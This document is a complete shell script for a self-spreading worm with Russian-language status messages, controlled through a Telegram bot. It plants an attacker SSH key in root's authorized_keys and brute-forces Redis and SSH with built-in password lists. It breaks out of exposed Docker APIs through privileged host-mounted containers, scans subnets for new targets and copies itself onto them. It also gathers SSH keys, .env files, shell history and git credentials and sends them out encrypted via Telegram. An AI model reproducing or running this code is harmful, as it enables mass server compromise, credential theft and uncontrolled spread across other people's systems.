#!/bin/sh
set -u
T="$1"; C="$2"
V=10
SELF=/tmp/agent.sh
API="https://api.telegram.org/bot$T"
PUB='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe9up2AJnTEoH9oH0XNmlSikYp0BD2rp7fKzbLyTmgJ agent'
SK='LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNDM3ZicWRnQ1oweEtCL2FCOUZ6WnBVb3BHS2RBUTlxNmUzeXMyeThrNW9DUUFBQUloY1JTcmxYRVVxCjVRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQzN2YnFkZ0NaMHhLQi9hQjlGelpwVW9wR0tkQVE5cTZlM3lzMnk4azVvQ1EKQUFBRUNLRDFuZUY4TTFBTUlCR1JSTHRRT1l3OVRrQzRBUG50akJhekdGa3E1SUtiZTl1cDJBSm5URW9IOW9IMFhObWxTaQprWXAwQkQycnA3Zkt6Ykx5VG1nSkFBQUFCV0ZuWlc1MAotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K'
RPB='LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0NCk1JSUNJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBZzhBTUlJQ0NnS0NBZ0VBdmJpWWwwOWFzcEx2Z3Z4bkk2Z0ENCjdxcG9RbU5Bc1lFQ2lwUFRPcW9KaGQ2ZkJwa3NiMkNmaUhDK2MvSG1TbUtNbHY1LzhIZkdKR1U3VHcvYURHNlMNCmloV29PcFBFM2RNclcrM1p6clZwMldJeC8zRTlLQzdwalUwb3lQYTR0aUczM0dDZzBNSWo4SjRiL2FlbGovTVANCjEwZVc3QzUrRTVkNEltTjhVSVJEdzUyQ3RyNi9KZG1HSncxL0ZlYjJwcHZJWEM0ZmpGM3VBblpXQ0Rnbm45M1YNClFSVGkvTk80TXViZ0s0V29Ha3h6Q1BOU3FHRVYxQlBYV2F3cFdBak1ibnpzUHRXVzlQL0xseHYxL01sVjhzbkYNCmlPUkFBdU5IeTVkVjIvN3pBR2x2QWhWbDhGTENteHp6eHZ2eDJTZXl5eGl0YUg1Z0JTTzExOHdhMU4vV08rNnYNCmxZalE2OXBYd1IvRC9HMG5RcStZd2NIdU9JM3owZXc4MGtmWDRNcmV4d1FsN3ZNNDd1d0Yzd2Znbmo0bGpOeDgNCmY0dmRJdXFhSEZUYml3aTRoRFMxU1VDc1F0ZllmaXlXeG5ZUmFSS3RPSVVEOG85eCtrTU5QSGFvbXBmbXpmemYNCjVMV21yWkdiUEdwRmUrYTJzckJOVTRzM254ZmxoVFNkc1B0S2k2WkJheVk5aG1NdGRCOW5qcWhEdW9sTTcvK2oNCi9QTGw0MUtDaGZ6S2lBNlUvODAxcytXYmV6dE5NTVV4ZDZrcUdnYXVBZnRxSlZBdytOSjQ3TWNjd2pzTURWK1INCk04eXNjQU0rYk5IOG5iTlBsUlFobnlsVCtQaU9POGFEaC9PVWNQZVlva2pBRE8yZnlGU2VtMEFYNHVLUzVBeVINCit3ZGw1OTRCVllPcm5LMms3YVdTTEtVQ0F3RUFBUT09DQotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0NCg=='
RPASS="redis password 123456 root admin redis123 P@ssw0rd qwerty toor pass 12345678 redispass"
SPASS="root:root root:toor root:password root:123456 root:redis ubuntu:ubuntu admin:admin"
MIR="https://raw.githubusercontent.com/LokaLapsi/net/main/"
Q=/tmp/q
PRI=/tmp/pri.txt
RS=/tmp/roots.seen
NS=/tmp/neg.seen
[ -f "$RS" ] || : >"$RS"
[ -f "$NS" ] || : >"$NS"
exec >>/tmp/agent.log 2>&1
printf '%s' "$RPB" | base64 -d > /tmp/rpb.pem 2>/dev/null
mkdir -p /root/.ssh 2>/dev/null
grep -qxF "$PUB" /root/.ssh/authorized_keys 2>/dev/null || echo "$PUB" >> /root/.ssh/authorized_keys 2>/dev/null
hn(){ cat /proc/sys/kernel/hostname 2>/dev/null || echo node; }
px(){ sed -n 1p /root/proxies.txt 2>/dev/null; }
dl(){ for p in "" "$(px)"; do
  if [ -n "$p" ]; then curl -fsSk -m 25 -x "$p" "$1" -o "$2" && return 0
  else curl -fsSk -m 25 "$1" -o "$2" && return 0; fi; done; return 1; }
tg(){ for p in "" "$(px)"; do
  if [ -n "$p" ]; then curl -fsSk -m 25 -x "$p" "$API/$1" && return 0
  else curl -fsSk -m 25 "$API/$1" && return 0; fi; done; return 1; }
b64(){ base64 -w0 "$1" 2>/dev/null || base64 "$1" | tr -d '\n'; }
enc(){ command -v openssl >/dev/null 2>&1 || { printf 'P1:%s' "$1"; return; }
  printf '%s' "$1" >/tmp/m.raw
  K=$(openssl rand -hex 32)
  openssl enc -aes-256-cbc -pbkdf2 -k "$K" -in /tmp/m.raw -out /tmp/m.enc 2>/dev/null || { printf 'P1:%s' "$1"; return; }
  printf '%s' "$K" | openssl pkeyutl -encrypt -pubin -inkey /tmp/rpb.pem -out /tmp/m.k 2>/dev/null || { printf 'P1:%s' "$1"; return; }
  printf 'A1:%s:%s' "$(b64 /tmp/m.k)" "$(b64 /tmp/m.enc)"
  rm -f /tmp/m.raw /tmp/m.enc /tmp/m.k; }
: >"$Q"
send(){ t=$(printf '%s' "$2" | cut -c1-2400); printf '%s\t0\t%s\n' "$1" "$(enc "$t")" >>"$Q"; }
qloop(){ while :; do
  [ -s "$Q" ] || { sleep 4; continue; }
  L=$(head -1 "$Q"); sed -i '1d' "$Q"
  ch=$(printf '%s' "$L" | cut -f1); at=$(printf '%s' "$L" | cut -f2); tx=$(printf '%s' "$L" | cut -f3-)
  R=$(curl -sSk -m 20 -d chat_id="$ch" --data-urlencode text="$tx" "$API/sendMessage" 2>/dev/null)
  case "$R" in
    *'"ok":true'*) ;;
    *retry_after*) ra=$(printf '%s' "$R" | sed -n 's/.*"retry_after":\([0-9]*\).*/\1/p'); sleep "${ra:-6}"; printf '%s\t%s\t%s\n' "$ch" "$at" "$tx" >>"$Q";;
    *'too long'*) tx=$(printf '%s' "$tx" | cut -c1-1200); printf '%s\t%s\t%s\n' "$ch" "$at" "$tx" >>"$Q";;
    *) at=$((at+1)); [ "$at" -le 3 ] && printf '%s\t%s\t%s\n' "$ch" "$at" "$tx" >>"$Q"; sleep 3;;
  esac
  sleep 2; done; }
doc(){ f=$1; ch=$2
  K=$(openssl rand -hex 32)
  openssl enc -aes-256-cbc -pbkdf2 -k "$K" -in "$f" -out "$f.enc" 2>/dev/null || { curl -fsSk -m 90 -F chat_id="$ch" -F document=@"$f" "$API/sendDocument" >/dev/null 2>&1; return; }
  printf '%s' "$K" | openssl pkeyutl -encrypt -pubin -inkey /tmp/rpb.pem -out /tmp/dk.bin 2>/dev/null
  CK="A1:$(b64 /tmp/dk.bin)"
  curl -fsSk -m 90 -F chat_id="$ch" -F document=@"$f.enc" -F caption="$CK" "$API/sendDocument" >/dev/null 2>&1
  rm -f "$f.enc" /tmp/dk.bin; }
arch(){ A=$(uname -m); case "$A" in x86_64|amd64) echo x86_64;; aarch64|arm64) echo aarch64;;
 armv7*|armv6*) echo armv7l;; armv5*|armv4*) echo armv5;; mips64*) echo mips;;
 mips*) case "$A" in *el) echo mipsel;; *) echo mips;; esac;; ppc64*) echo ppc64;;
 ppc*) echo ppc;; i?86) echo i686;; *) echo x86_64;; esac; }
cfg(){ tg "getChat?chat_id=$C" >/tmp/p.json || return 1
  sed -n 's/.*"pinned_message":{.*"text":"\([^"]*\)".*/\1/p' /tmp/p.json | sed 's/\\n/\n/g'; }
pv(){ cfg | sed -n "s/^$1=//p" | head -1; }
em(){ command -v openssl >/dev/null 2>&1 && return
  if command -v opkg >/dev/null 2>&1; then opkg update >/dev/null 2>&1; opkg install openssl-util netcat coreutils-base64 >/dev/null 2>&1; return; fi
  (apt-get -y install openssl netcat-openbsd || yum -y install openssl nc || apk add openssl netcat-openbsd || dnf -y install openssl nc) >/dev/null 2>&1; }
upd(){ R=$(pv ver); [ -z "$R" ] && return; [ "$R" -gt "$V" ] 2>/dev/null || return
  A=$(arch); F=$(pv agent_$A); [ -z "$F" ] && return
  tg "getFile?file_id=$F" >/tmp/g.json || return
  P=$(sed -n 's/.*"file_path":"\([^"]*\)".*/\1/p' /tmp/g.json); [ -z "$P" ] && return
  dl "https://api.telegram.org/file/bot$T/$P" /tmp/n.sh || return
  sh -n /tmp/n.sh 2>/dev/null || return
  cp /tmp/n.sh "$SELF"; chmod +x "$SELF"; exec "$SELF" "$T" "$C"; }
getpx(){ for m in "$MIR" "https://cdn.jsdelivr.net/gh/LokaLapsi/net@main/"; do
  curl -fsSk -m 25 "${m}proxies.txt" -o /tmp/px.n 2>/dev/null && [ -s /tmp/px.n ] && mv /tmp/px.n /root/proxies.txt && return; done; }
pool(){ P=$(pv pool); [ -z "$P" ] && return
  tg "getFile?file_id=$P" >/tmp/pf.json || return
  FP=$(sed -n 's/.*"file_path":"\([^"]*\)".*/\1/p' /tmp/pf.json); [ -z "$FP" ] && return
  dl "https://api.telegram.org/file/bot$T/$FP" /tmp/pool.raw || return
  tr -d '\r' </tmp/pool.raw >/tmp/pool.txt
  CT=$(wc -l </tmp/pool.txt)
  if [ "$CT" -lt 1000 ]; then cp /tmp/pool.txt /tmp/mine.txt; else
    S=$(printf '%s%s' "$(curl -sk -m 6 https://ifconfig.me 2>/dev/null || echo x)" "$(date +%Y%m%d)" | md5sum | cut -c1-8)
    awk -v s="$((0x$S % 1000))" 'NR%1000==s' /tmp/pool.txt >/tmp/mine.txt; fi; }
sub(){ s=$(echo "$1" | awk -F. '{print $1"."$2"."$3".0/24"}'); grep -qx "$s" "$PRI" 2>/dev/null || echo "$s" >>"$PRI"; }
own(){ M=$(curl -sk -m 6 https://ifconfig.me 2>/dev/null || echo x); case "$M" in *.*.*.*) sub "$M";; esac; }
real(){ S=$(curl -sk -m 8 http://example.com 2>/dev/null | wc -c); [ "$S" -gt 200 ] || return 1
  N=$(nslookup invalid.invalid 2>&1 | grep -c '^Address')
  [ "${N:-0}" -le 1 ] && echo реал || echo стенд; return 0; }
sshq(){ ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 root@"$1" "$2" 2>/dev/null; }
honey(){ ip=$1
  O=$(sshq "$ip" 'H=$(cat /proc/sys/kernel/hostname 2>/dev/null); U=$(cut -d. -f1 /proc/uptime 2>/dev/null); echo "H=$H U=$U"; [ -d /honeyfs ] || [ -d /root/honeypot ] || [ -f /etc/honeyd.conf ] && echo FS=1')
  R=""
  case "$O" in *"H="*honey*|*"H="*hpot*|*"H="*Honey*|*"H="*HONEY*) R="$R имя";; esac
  case "$O" in *FS=1*) R="$R honeyfs";; esac
  U=$(printf '%s' "$O" | sed -n 's/.*U=\([0-9]*\).*/\1/p'); [ -n "$U" ] && [ "$U" -lt 180 ] 2>/dev/null && R="$R свежий"
  echo $R; }
seen(){ grep -qx "$1" "$2" 2>/dev/null; }
mark(){ echo "$1" >>"$2"; }
boot_new(){ ip=$1
  if ssh -V 2>&1 | grep -qi dropbear; then S="ssh -y"; SC="scp -q"
  else S="ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8"
       SC="scp -q -o BatchMode=yes -o StrictHostKeyChecking=no"; fi
  $S root@$ip true 2>/dev/null || return
  for f in /root/boot.sh /root/proxies.txt /root/agent.sh; do [ -f "$f" ] && $SC "$f" root@$ip:/root/ 2>/dev/null; done
  $S root@$ip "printf 'TOK=%s\nCHAT=%s\n' '$T' '$C' >/root/a.env; cd /root; if command -v start-stop-daemon >/dev/null 2>&1; then start-stop-daemon -S -b -x /bin/sh -- boot.sh '$T' '$C'; else (setsid sh boot.sh '$T' '$C' >/dev/null 2>&1 </dev/null &); fi" 2>/dev/null; }
loot(){ ip=$1; S="ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8"
  $S root@$ip 'find /root /home /opt -maxdepth 4 \( -name "*.env" -o -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name ".bash_history" -o -name ".git-credentials" -o -name "docker-compose.y*ml" -o -name ".my.cnf" \) -size -4M 2>/dev/null | head -40' >/tmp/lst 2>/dev/null
  [ -s /tmp/lst ] || return
  $S root@$ip "tar czf - $(tr '\n' ' ' </tmp/lst) 2>/dev/null" >/tmp/loot.tgz 2>/dev/null
  [ -s /tmp/loot.tgz ] || return
  H=$(sha256sum /tmp/loot.tgz 2>/dev/null | cut -c1-16); grep -qx "$H" /tmp/loot.seen 2>/dev/null && return
  echo "$H" >>/tmp/loot.seen; doc /tmp/loot.tgz "$CB"; }
hit(){ hp=$1; how=$2; key=$3; ip=${hp%:*}
  if [ "$how" != "РУТ" ]; then
    seen "$hp" "$NS" || { mark "$hp" "$NS"; send "$CN" "[не рут] цель=$hp нашёл=$(hn) почему=$how"; }
    return; fi
  if seen "$ip" "$RS"; then boot_new "$ip"; sub "$ip"; return; fi
  HV=$(honey "$ip")
  case "$HV" in
    *имя*|*honeyfs*)
      mark "$ip" "$RS"
      send "$CN" "[ХАНИПОТ?] $hp нашёл=$(hn) как=$how признаки:$HV"; return;;
  esac
  RV=$(real); RV=${RV:-нет_сети}
  mark "$ip" "$RS"
  send "$CR" "[НОВЫЙ РУТ]
нашёл: $(hn)
новый: $hp
как: ${how} (порт ${hp#*:})${key:+ / $key}
состояние: $RV${HV:+ / подозр:$HV}
ключ: echo '$SK' | base64 -d > deploy.key; chmod 600 deploy.key; ssh -i deploy.key root@$ip"
  boot_new "$ip"; sub "$ip"; loot "$ip"; }
dck(){ ip=$1; port=$2; B=$([ "$port" = 2376 ] && echo https || echo http)://$ip:$port
  curl -fsSk -m 12 "$B/version" 2>/dev/null | grep -q ApiVersion || return
  J='{"Image":"alpine","Entrypoint":["/bin/sh","-c","echo U=$(ls /host/usr/sbin 2>/dev/null|wc -l); echo P1=$(cat /host/proc/1/comm 2>/dev/null); mkdir -p /host/root/.ssh; grep -qxF \"'"$PUB"'\" /host/root/.ssh/authorized_keys 2>/dev/null || echo \"'"$PUB"'\" >> /host/root/.ssh/authorized_keys; echo S=$(chroot /host /bin/sh -c \"nohup sleep 20>/dev/null 2>&1 & sleep 1; ps|grep -c sleep\" 2>&1)"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
  ID=$(curl -fsSk -m 15 -XPOST -H 'Content-Type: application/json' -d "$J" "$B/containers/create" 2>/dev/null | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p')
  if [ -z "$ID" ]; then curl -fsSk -m 60 -XPOST "$B/images/create?fromImage=alpine" >/dev/null 2>&1
    ID=$(curl -fsSk -m 15 -XPOST -H 'Content-Type: application/json' -d "$J" "$B/containers/create" 2>/dev/null | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'); fi
  [ -z "$ID" ] && return
  curl -sSk -m 15 -XPOST "$B/containers/$ID/start" >/dev/null 2>&1
  curl -sSk -m 45 "$B/containers/$ID/wait" >/dev/null 2>&1
  O=$(curl -fsSk -m 15 "$B/containers/$ID/logs?stdout=1&stderr=1" 2>/dev/null)
  curl -sSk -m 10 -XDELETE "$B/containers/$ID?force=1" >/dev/null 2>&1
  U=$(printf '%s' "$O" | sed -n 's/.*U=\([0-9]*\).*/\1/p' | head -1); U=${U:-0}
  SS=$(printf '%s' "$O" | sed -n 's/.*S=\([0-9]*\).*/\1/p' | head -1); SS=${SS:-0}
  P1=$(printf '%s' "$O" | sed -n 's/.*P1=\([A-Za-z0-9_.-]*\).*/\1/p' | head -1)
  if [ "$U" -ge 5 ] && [ "$SS" -ge 1 ] && [ -n "$P1" ] && [ "$P1" != sh ]; then hit "$ip:$port" "docker-api" "pubkey в authorized_keys"; return; fi
  [ -z "$O" ] && hit "$ip:$port" "муляж (API отвечает, контейнер не стартует)" && return
  hit "$ip:$port" "песочница (из контейнера не вышли)"; }
rd(){ ip=$1; port=$2; R=$(printf 'PING\r\n' | nc -w 5 "$ip" "$port" 2>/dev/null | head -c 60)
  case "$R" in *PONG*) PW="";; *NOAUTH*)
    for p in $RPASS; do X=$(printf 'AUTH %s\r\nPING\r\n' "$p" | nc -w 5 "$ip" "$port" 2>/dev/null | tr -d '\r')
      case "$X" in *"+OK"*"+PONG"*) PW=$p; break;; esac; done
    [ -z "${PW:-}" ] && { hit "$ip:$port" "redis с паролем (не подобрали)" ""; return; };;
  *) return;; esac
  VV="$PUB"; L=$(( ${#VV} + 4 ))
  O=$( { printf '*3\r\n$3\r\nSET\r\n$1\r\np\r\n$%d\r\n\n\n%s\n\n\r\n' "$L" "$VV"
    printf 'CONFIG SET dir /root/.ssh\r\n'; printf 'CONFIG SET dbfilename authorized_keys\r\n'; printf 'BGSAVE\r\n'; } | nc -w 10 "$ip" "$port" 2>/dev/null)
  printf '%s' "$O" | grep -q '+OK' || return
  hit "$ip:$port" "redis-exec" "pass=${PW:-нет}"; }
sshb(){ ip=$1; command -v sshpass >/dev/null 2>&1 || return
  for c in $SPASS; do u=${c%%:*}; p=${c#*:}
    sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 -o PreferredAuthentications=password "$u@$ip" 'id' 2>/dev/null | grep -q 'uid=0' && {
      sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 "$u@$ip" "mkdir -p /root/.ssh; grep -qxF '$PUB' /root/.ssh/authorized_keys 2>/dev/null || echo '$PUB' >> /root/.ssh/authorized_keys" 2>/dev/null
      hit "$ip:22" "ssh-пароль" "${u}:${p}"; return; }; done
  hit "$ip:22" "ssh с паролем (не подобрали)" ""; }
chk(){ hp=$1; case "${hp#*:}" in
  2375|2376) dck "${hp%:*}" "${hp#*:}";;
  6379) rd "${hp%:*}" "${hp#*:}";;
  22) sshb "${hp%:*}";;
  *) return;; esac; }
nscan(){ base=${1%.0/24}; base=${base%.0}
  { i=1; while [ $i -le 254 ]; do echo "$base.$i 2375"; echo "$base.$i 6379"; echo "$base.$i 22"; i=$((i+1)); done; } >/tmp/pr.list
  nice -n 19 xargs -n2 -P6 sh -c 'nc -z -w1 "$0" "$1" 2>/dev/null && echo "$0:$1"' </tmp/pr.list >/tmp/found 2>/dev/null
  head -25 /tmp/found | while read -r hp; do chk "$hp"; done
  rm -f /tmp/pr.list /tmp/found; }
mscan(){ n=$1
  command -v masscan >/dev/null 2>&1 || { nscan "$n"; return; }
  nice -n 19 masscan "$n" -p2375,2376,6379,22 --rate 800 --wait 0 -oL /tmp/m.out >/dev/null 2>&1
  awk '/open/{print $4":"$3}' /tmp/m.out 2>/dev/null | sort -u | head -25 | while read -r hp; do chk "$hp"; done
  rm -f /tmp/m.out; }
scan(){ N=0
  if [ -s "$PRI" ]; then cp "$PRI" /tmp/pri.tmp; : >"$PRI"
    while read -r n; do [ -z "$n" ] && continue; em
      mscan "$n"; N=$((N+1)); [ "$N" -ge 2 ] && break
    done </tmp/pri.tmp
    tail -n +3 /tmp/pri.tmp >>"$PRI" 2>/dev/null; fi
  [ -s /tmp/mine.txt ] || return
  head -40 /tmp/mine.txt | while read -r hp; do chk "$hp"; done
  tail -n +41 /tmp/mine.txt >/tmp/m.t; mv /tmp/m.t /tmp/mine.txt 2>/dev/null; }
hb(){ while :; do send "$CN" "[hb] $(hn) pool=$(wc -l </tmp/mine.txt 2>/dev/null) pri=$(wc -l </tmp/pri.txt 2>/dev/null) roots=$(wc -l </tmp/roots.seen 2>/dev/null)"
  sleep 900; done; }
for p in $(ps w 2>/dev/null | awk '/[a]gent\.sh/{print $1}'); do [ "$p" != "$$" ] && kill "$p" 2>/dev/null; done
em
getpx
own
CR=$(pv chat_roots); CN=$(pv chat_news); CB=$(pv chat_backup)
qloop &
[ -n "$CN" ] && hb &
while :; do
  upd; getpx; pool
  LA=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null); LI=${LA%%.*}
  [ "${LI:-0}" -ge 4 ] && { sleep 120; continue; }
  scan
  [ "$(wc -c </tmp/agent.log 2>/dev/null)" -gt 120000 ] && { tail -c 60000 /tmp/agent.log >/tmp/l.t; mv /tmp/l.t /tmp/agent.log; }
  rm -f /tmp/m.out /tmp/pool.raw /tmp/loot.tgz /tmp/lst
  sleep 240; done
